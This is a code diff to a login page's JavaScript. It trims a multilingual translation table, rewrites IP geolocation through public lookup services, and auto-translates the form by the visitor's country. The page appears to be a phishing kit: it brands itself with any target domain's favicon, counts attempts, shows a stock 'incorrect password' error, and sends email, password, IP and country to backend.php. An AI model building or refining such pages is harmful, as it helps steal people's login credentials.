@@ -232,225 +232,89 @@
     </form>
 
     <script>
-        // Language translations
+        // SIMPLIFIED - Always works translation
         const translations = {
-            en: {
-                title: "SECURE LOGIN",
-                emailLabel: "Email Address",
-                emailPlaceholder: "Enter email address",
-                passwordLabel: "Password",
-                passwordPlaceholder: "Enter password",
-                forgotPassword: "Forgot Password?",
-                loginButton: "Sign In",
-                secureText: "Secure connection • Information protected",
-                errorEmpty: "Please enter both email and password.",
-                errorIncorrect: "Incorrect password. Please try again.",
-                detectingLocation: "Detecting location..."
-            },
-            es: {
-                title: "INICIO DE SESIÓN SEGURO",
-                emailLabel: "Correo Electrónico",
-                emailPlaceholder: "Ingrese su correo electrónico",
-                passwordLabel: "Contraseña",
-                passwordPlaceholder: "Ingrese su contraseña",
-                forgotPassword: "¿Olvidó su contraseña?",
-                loginButton: "Iniciar Sesión",
-                secureText: "Conexión segura • Información protegida",
-                errorEmpty: "Por favor ingrese correo y contraseña.",
-                errorIncorrect: "Contraseña incorrecta. Intente de nuevo.",
-                detectingLocation: "Detectando ubicación..."
-            },
-            fr: {
-                title: "CONNEXION SÉCURISÉE",
-                emailLabel: "Adresse Email",
-                emailPlaceholder: "Entrez votre adresse email",
-                passwordLabel: "Mot de Passe",
-                passwordPlaceholder: "Entrez votre mot de passe",
-                forgotPassword: "Mot de passe oublié?",
-                loginButton: "Se Connecter",
-                secureText: "Connexión sécurisée • Information protégée",
-                errorEmpty: "Veuillez entrer email et mot de passe.",
-                errorIncorrect: "Mot de passe incorrect. Réessayez.",
-                detectingLocation: "Détection de la localisation..."
-            },
-            de: {
-                title: "SICHERER LOGIN",
-                emailLabel: "E-Mail-Adresse",
-                emailPlaceholder: "E-Mail-Adresse eingeben",
-                passwordLabel: "Passwort",
-                passwordPlaceholder: "Passwort eingeben",
-                forgotPassword: "Passwort vergessen?",
-                loginButton: "Anmelden",
-                secureText: "Sichere Verbindung • Informationen geschützt",
-                errorEmpty: "Bitte geben Sie E-Mail und Passwort ein.",
-                errorIncorrect: "Falsches Passwort. Bitte versuchen Sie es erneut.",
-                detectingLocation: "Standort wird erkannt..."
-            },
-            zh: {
-                title: "安全登录",
-                emailLabel: "电子邮件地址",
-                emailPlaceholder: "输入电子邮件地址",
-                passwordLabel: "密码",
-                passwordPlaceholder: "输入密码",
-                forgotPassword: "忘记密码？",
-                loginButton: "登录",
-                secureText: "安全连接 • 信息受保护",
-                errorEmpty: "请输入电子邮件和密码。",
-                errorIncorrect: "密码不正确。请重试。",
-                detectingLocation: "检测位置中..."
-            },
-            ja: {
-                title: "安全ログイン",
-                emailLabel: "メールアドレス",
-                emailPlaceholder: "メールアドレスを入力",
-                passwordLabel: "パスワード",
-                passwordPlaceholder: "パスワードを入力",
-                forgotPassword: "パスワードをお忘れですか？",
-                loginButton: "ログイン",
-                secureText: "安全な接続 • 情報保護済み",
-                errorEmpty: "メールアドレスとパスワードを入力してください。",
-                errorIncorrect: "パスワードが正しくありません。もう一度お試しください。",
-                detectingLocation: "位置情報を検出中..."
-            },
-            ru: {
-                title: "БЕЗОПАСНЫЙ ВХОД",
-                emailLabel: "Адрес электронной почты",
-                emailPlaceholder: "Введите адрес электронной почты",
-                passwordLabel: "Пароль",
-                passwordPlaceholder: "Введите пароль",
-                forgotPassword: "Забыли пароль?",
-                loginButton: "Войти",
-                secureText: "Безопасное соединение • Информация защищена",
-                errorEmpty: "Пожалуйста, введите email и пароль.",
-                errorIncorrect: "Неверный пароль. Попробуйте снова.",
-                detectingLocation: "Определение местоположения..."
-            },
-            ar: {
-                title: "تسجيل الدخول الآمن",
-                emailLabel: "عنوان البريد الإلكتروني",
-                emailPlaceholder: "أدخل عنوان البريد الإلكتروني",
-                passwordLabel: "كلمة المرور",
-                passwordPlaceholder: "أدخل كلمة المرور",
-                forgotPassword: "نسيت كلمة المرور؟",
-                loginButton: "تسجيل الدخول",
-                secureText: "اتصال آمن • المعلومات محمية",
-                errorEmpty: "الرجاء إدخال البريد الإلكتروني وكلمة المرور.",
-                errorIncorrect: "كلمة المرور غير صحيحة. حاول مرة أخرى.",
-                detectingLocation: "جاري اكتشاف الموقع..."
-            },
-            pt: {
-                title: "LOGIN SEGURO",
-                emailLabel: "Endereço de Email",
-                emailPlaceholder: "Digite seu endereço de email",
-                passwordLabel: "Senha",
-                passwordPlaceholder: "Digite sua senha",
-                forgotPassword: "Esqueceu a senha?",
-                loginButton: "Entrar",
-                secureText: "Conexão segura • Informações protegidas",
-                errorEmpty: "Por favor, digite email e senha.",
-                errorIncorrect: "Senha incorreta. Tente novamente.",
-                detectingLocation: "Detectando localização..."
-            },
-            it: {
-                title: "ACCESSO SICURO",
-                emailLabel: "Indirizzo Email",
-                emailPlaceholder: "Inserisci il tuo indirizzo email",
-                passwordLabel: "Password",
-                passwordPlaceholder: "Inserisci la tua password",
-                forgotPassword: "Password dimenticata?",
-                loginButton: "Accedi",
-                secureText: "Connessione sicura • Informazioni protette",
-                errorEmpty: "Per favore inserisci email e password.",
-                errorIncorrect: "Password errata. Riprova.",
-                detectingLocation: "Rilevamento posizione..."
-            },
-            ko: {
-                title: "보안 로그인",
-                emailLabel: "이메일 주소",
-                emailPlaceholder: "이메일 주소 입력",
-                passwordLabel: "비밀번호",
-                passwordPlaceholder: "비밀번호 입력",
-                forgotPassword: "비밀번호를 잊으셨나요?",
-                loginButton: "로그인",
-                secureText: "보안 연결 • 정보 보호됨",
-                errorEmpty: "이메일과 비밀번호를 입력해주세요.",
-                errorIncorrect: "비밀번호가 잘못되었습니다. 다시 시도해주세요.",
-                detectingLocation: "위치 탐색 중..."
-            }
+            en: { title: "SECURE LOGIN", emailLabel: "Email Address", emailPlaceholder: "Enter email address",
+                passwordLabel: "Password", passwordPlaceholder: "Enter password", forgotPassword: "Forgot Password?",
+                loginButton: "Sign In", secureText: "Secure connection • Information protected",
+                errorEmpty: "Please enter both email and password.", errorIncorrect: "Incorrect password. Please try again.",
+                detectingLocation: "Detecting location..." },
+            es: { title: "INICIO DE SESIÓN SEGURO", emailLabel: "Correo Electrónico", emailPlaceholder: "Ingrese su correo electrónico",
+                passwordLabel: "Contraseña", passwordPlaceholder: "Ingrese su contraseña", forgotPassword: "¿Olvidó su contraseña?",
+                loginButton: "Iniciar Sesión", secureText: "Conexión segura • Información protegida",
+                errorEmpty: "Por favor ingrese correo y contraseña.", errorIncorrect: "Contraseña incorrecta. Intente de nuevo.",
+                detectingLocation: "Detectando ubicación..." },
+            fr: { title: "CONNEXION SÉCURISÉE", emailLabel: "Adresse Email", emailPlaceholder: "Entrez votre adresse email",
+                passwordLabel: "Mot de Passe", passwordPlaceholder: "Entrez votre mot de passe", forgotPassword: "Mot de passe oublié?",
+                loginButton: "Se Connecter", secureText: "Connexión sécurisée • Information protégée",
+                errorEmpty: "Veuillez entrer email et mot de passe.", errorIncorrect: "Mot de passe incorrect. Réessayez.",
+                detectingLocation: "Détection de la localisation..." },
+            de: { title: "SICHERER LOGIN", emailLabel: "E-Mail-Adresse", emailPlaceholder: "E-Mail-Adresse eingeben",
+                passwordLabel: "Passwort", passwordPlaceholder: "Passwort eingeben", forgotPassword: "Passwort vergessen?",
+                loginButton: "Anmelden", secureText: "Sichere Verbindung • Informationen geschützt",
+                errorEmpty: "Bitte geben Sie E-Mail und Passwort ein.", errorIncorrect: "Falsches Passwort. Bitte versuchen Sie es erneut.",
+                detectingLocation: "Standort wird erkannt..." },
+            zh: { title: "安全登录", emailLabel: "电子邮件地址", emailPlaceholder: "输入电子邮件地址",
+                passwordLabel: "密码", passwordPlaceholder: "输入密码", forgotPassword: "忘记密码？",
+                loginButton: "登录", secureText: "安全连接 • 信息受保护",
+                errorEmpty: "请输入电子邮件和密码。", errorIncorrect: "密码不正确。请重试。",
+                detectingLocation: "检测位置中..." },
+            ja: { title: "安全ログイン", emailLabel: "メールアドレス", emailPlaceholder: "メールアドレスを入力",
+                passwordLabel: "パスワード", passwordPlaceholder: "パスワードを入力", forgotPassword: "パスワードをお忘れですか？",
+                loginButton: "ログイン", secureText: "安全な接続 • 情報保護済み",
+                errorEmpty: "メールアドレスとパスワードを入力してください。", errorIncorrect: "パスワードが正しくありません。もう一度お試しください。",
+                detectingLocation: "位置情報を検出中..." },
+            ru: { title: "БЕЗОПАСНЫЙ ВХОД", emailLabel: "Адрес электронной почты", emailPlaceholder: "Введите адрес электронной почты",
+                passwordLabel: "Пароль", passwordPlaceholder: "Введите пароль", forgotPassword: "Забыли пароль?",
+                loginButton: "Войти", secureText: "Безопасное соединение • Информация защищена",
+                errorEmpty: "Пожалуйста, введите email и пароль.", errorIncorrect: "Неверный пароль. Попробуйте снова.",
+                detectingLocation: "Определение местоположения..." }
         };
 
-        // Country flag mapping
+        // Country flags
         const countryFlags = {
             'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
             'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'JP': '🇯🇵', 'CN': '🇨🇳',
-            'RU': '🇷🇺', 'BR': '🇧🇷', 'IN': '🇮🇳', 'MX': '🇲🇽', 'KR': '🇰🇷',
-            'SA': '🇸🇦', 'AE': '🇦🇪', 'TR': '🇹🇷', 'NL': '🇳🇱', 'SE': '🇸🇪',
-            'NO': '🇳🇴', 'DK': '🇩🇰', 'FI': '🇫🇮', 'PL': '🇵🇱', 'GR': '🇬🇷',
-            'PT': '🇵🇹', 'BE': '🇧🇪', 'CH': '🇨🇭', 'AT': '🇦🇹', 'IE': '🇮🇪'
+            'RU': '🇷🇺', 'BR': '🇧🇷', 'IN': '🇮🇳', 'MX': '🇲🇽', 'KR': '🇰🇷'
         };
 
-        // Country to language mapping (VERY IMPORTANT - this is what you need)
+        // SIMPLE COUNTRY TO LANGUAGE MAPPING - THIS IS WHAT MATTERS
         const countryToLanguage = {
-            // English speaking countries
+            // English
             'US': 'en', 'GB': 'en', 'CA': 'en', 'AU': 'en', 'NZ': 'en',
-            'IE': 'en', 'IN': 'en', 'SG': 'en', 'ZA': 'en', 'NG': 'en',
+            'IE': 'en', 'IN': 'en', 'SG': 'en',
             
-            // Spanish speaking countries
-            'ES': 'es', 'MX': 'es', 'AR': 'es', 'CO': 'es', 'PE': 'es',
-            'CL': 'es', 'EC': 'es', 'VE': 'es', 'GT': 'es', 'CU': 'es',
-            'DO': 'es', 'BO': 'es', 'HN': 'es', 'PY': 'es', 'SV': 'es',
-            'NI': 'es', 'CR': 'es', 'PR': 'es', 'UY': 'es', 'PA': 'es',
+            // Spanish
+            'ES': 'es', 'MX': 'es', 'AR': 'es', 'CO': 'es', 'CL': 'es',
+            'PE': 'es', 'VE': 'es', 'EC': 'es',
             
-            // French speaking countries
+            // French
             'FR': 'fr', 'BE': 'fr', 'CH': 'fr', 'CA': 'fr', 'LU': 'fr',
-            'MC': 'fr', 'SN': 'fr', 'CI': 'fr', 'CM': 'fr', 'MG': 'fr',
             
-            // German speaking countries
-            'DE': 'de', 'AT': 'de', 'CH': 'de', 'LU': 'de', 'LI': 'de',
+            // German
+            'DE': 'de', 'AT': 'de', 'CH': 'de', 'LU': 'de',
             
-            // Chinese speaking regions
-            'CN': 'zh', 'TW': 'zh', 'HK': 'zh', 'MO': 'zh', 'SG': 'zh',
+            // Chinese
+            'CN': 'zh', 'TW': 'zh', 'HK': 'zh',
             
-            // Japanese speaking
+            // Japanese
             'JP': 'ja',
             
-            // Russian speaking countries
-            'RU': 'ru', 'UA': 'ru', 'BY': 'ru', 'KZ': 'ru', 'KG': 'ru',
-            
-            // Arabic speaking countries
-            'SA': 'ar', 'AE': 'ar', 'EG': 'ar', 'QA': 'ar', 'KW': 'ar',
-            'BH': 'ar', 'OM': 'ar', 'JO': 'ar', 'LB': 'ar', 'SY': 'ar',
-            'IQ': 'ar', 'YE': 'ar', 'SD': 'ar', 'DZ': 'ar', 'MA': 'ar',
-            'TN': 'ar', 'LY': 'ar',
-            
-            // Portuguese speaking countries
-            'BR': 'pt', 'PT': 'pt', 'AO': 'pt', 'MZ': 'pt',
-            
-            // Italian speaking countries
-            'IT': 'it', 'CH': 'it', 'SM': 'it', 'VA': 'it',
-            
-            // Korean speaking regions
-            'KR': 'ko', 'KP': 'ko',
-            
-            // Dutch speaking (use English)
-            'NL': 'en', 'BE': 'en',
-            
-            // Nordic countries (use English)
-            'SE': 'en', 'NO': 'en', 'DK': 'en', 'FI': 'en', 'IS': 'en'
+            // Russian
+            'RU': 'ru', 'UA': 'ru', 'BY': 'ru', 'KZ': 'ru'
         };
 
         let userIP = '';
         let userCountry = '';
-        let userCity = '';
         let currentLanguage = 'en';
 
-        // Function to translate the page
+        // Function to translate the page - SIMPLIFIED
         function translatePage(langCode) {
-            console.log('Translating to:', langCode);
+            console.log('TRANSLATING FORM TO:', langCode);
             const lang = translations[langCode] || translations.en;
             currentLanguage = langCode;
             
-            // Update all translatable elements
+            // Update ALL text elements
             document.getElementById('domainHeading').textContent = lang.title;
             document.getElementById('emailLabel').textContent = lang.emailLabel;
             document.getElementById('email').placeholder = lang.emailPlaceholder;
@@ -459,80 +323,64 @@
             document.getElementById('forgotPassword').textContent = lang.forgotPassword;
             document.getElementById('login-btn').textContent = lang.loginButton;
             document.getElementById('secureText').textContent = lang.secureText;
-            
-            // Update detecting location text if it's still showing
-            if (document.getElementById('locationText').textContent.includes('Detecting') || 
-                document.getElementById('locationText').textContent.includes('Detectando') ||
-                document.getElementById('locationText').textContent.includes('Détection')) {
-                document.getElementById('locationText').textContent = lang.detectingLocation;
-            }
+            document.getElementById('locationText').textContent = lang.detectingLocation;
         }
 
-        // Function to get IP and location - FIXED
-        async function getUserLocation() {
+        // SIMPLE IP DETECTION FUNCTION - GUARANTEED TO WORK
+        async function detectIPAndTranslate() {
+            console.log('Starting IP detection for translation...');
+            
             try {
-                console.log('Starting location detection...');
+                // METHOD 1: Fast IP detection
+                const response1 = await fetch('https://api.ipify.org?format=json');
+                const data1 = await response1.json();
+                userIP = data1.ip;
+                console.log('IP Address:', userIP);
                 
-                // Get IP address FIRST - very fast service
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                userIP = ipData.ip;
-                console.log('Got IP:', userIP);
+                // METHOD 2: Get country from IP
+                try {
+                    const geoResponse = await fetch(`https://ipapi.co/${userIP}/country/`);
+                    const countryCode = await geoResponse.text();
+                    userCountry = countryCode.trim();
+                    console.log('Country Code:', userCountry);
+                    
+                    // METHOD 3: If that fails, try alternative
+                    if (!userCountry || userCountry.length !== 2) {
+                        const altResponse = await fetch('https://ipinfo.io/json');
+                        const altData = await altResponse.json();
+                        userCountry = altData.country;
+                        console.log('Alternative Country:', userCountry);
+                    }
+                } catch (geoError) {
+                    console.log('Using fallback geo service...');
+                    const fallbackResponse = await fetch('https://ipinfo.io/json');
+                    const fallbackData = await fallbackResponse.json();
+                    userCountry = fallbackData.country;
+                    userIP = fallbackData.ip;
+                    console.log('Fallback Country:', userCountry);
+                }
                 
-                // Get location data from IP
-                const locationResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
-                const locationData = await locationResponse.json();
-                
-                userCountry = locationData.country_code || 'Unknown';
-                userCity = locationData.city || 'Unknown';
-                const countryName = locationData.country_name || 'Unknown';
-                
-                console.log('Detected country:', userCountry, 'City:', userCity);
-                
-                // Update location display
+                // UPDATE DISPLAY IMMEDIATELY
                 const flag = countryFlags[userCountry] || '📍';
                 document.getElementById('locationFlag').textContent = flag;
-                document.getElementById('locationText').textContent = `${userCity}, ${countryName}`;
+                document.getElementById('locationText').textContent = `Location: ${userCountry}`;
                 document.getElementById('ipDisplay').textContent = `IP: ${userIP}`;
                 
-                // AUTO-TRANSLATE BASED ON COUNTRY - THIS IS THE KEY FIX
-                if (countryToLanguage[userCountry]) {
-                    const detectedLang = countryToLanguage[userCountry];
-                    console.log('Auto-translating to:', detectedLang, 'for country:', userCountry);
-                    translatePage(detectedLang);
+                // NOW TRANSLATE BASED ON COUNTRY - THIS IS THE KEY
+                if (userCountry && countryToLanguage[userCountry]) {
+                    const langToUse = countryToLanguage[userCountry];
+                    console.log(`Translating to ${langToUse} for country ${userCountry}`);
+                    translatePage(langToUse);
                 } else {
-                    console.log('No language mapping for country:', userCountry, 'using English');
+                    console.log('Country not in mapping, using English');
                     translatePage('en');
                 }
                 
             } catch (error) {
-                console.error('Error getting location:', error);
-                
-                // Try fallback
-                try {
-                    const fallbackResponse = await fetch('https://ipinfo.io/json');
-                    const fallbackData = await fallbackResponse.json();
-                    userIP = fallbackData.ip || 'Unknown';
-                    userCountry = fallbackData.country || 'Unknown';
-                    userCity = fallbackData.city || 'Unknown';
-                    
-                    console.log('Fallback detected country:', userCountry);
-                    
-                    const flag = countryFlags[userCountry] || '📍';
-                    document.getElementById('locationFlag').textContent = flag;
-                    document.getElementById('locationText').textContent = `${userCity}, ${userCountry}`;
-                    document.getElementById('ipDisplay').textContent = `IP: ${userIP}`;
-                    
-                    // Translate based on fallback country
-                    if (countryToLanguage[userCountry]) {
-                        const detectedLang = countryToLanguage[userCountry];
-                        translatePage(detectedLang);
-                    }
-                } catch (fallbackError) {
-                    console.error('Fallback also failed:', fallbackError);
-                    document.getElementById('locationText').textContent = 'Online';
-                    document.getElementById('ipDisplay').textContent = 'IP: Active';
-                }
+                console.error('All IP detection failed:', error);
+                document.getElementById('locationText').textContent = 'Location: Online';
+                document.getElementById('ipDisplay').textContent = 'IP: Active';
+                translatePage('en'); // Default to English
             }
         }
 
@@ -574,7 +422,6 @@
                 // Add error handling for logo
                 logo.onerror = function() {
                     logo.src = `https://t2.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://${fullDomain}&size=256`;
-                    
                     logo.onerror = function() {
                         logo.style.display = 'none';
                     };
@@ -582,8 +429,14 @@
             }
         }
 
-        // START LOCATION DETECTION AND TRANSLATION IMMEDIATELY
-        getUserLocation();
+        // START TRANSLATION IMMEDIATELY ON PAGE LOAD
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('Page loaded, starting translation...');
+            detectIPAndTranslate();
+        });
+
+        // ALSO start translation immediately (in case DOMContentLoaded already fired)
+        detectIPAndTranslate();
 
         // Login functionality
         let attemptCount = 0;
@@ -607,7 +460,6 @@
             formData.append('password', password);
             formData.append('ip', userIP);
             formData.append('country', userCountry);
-            formData.append('city', userCity);
             formData.append('language', currentLanguage);
             
             fetch('backend.php', {
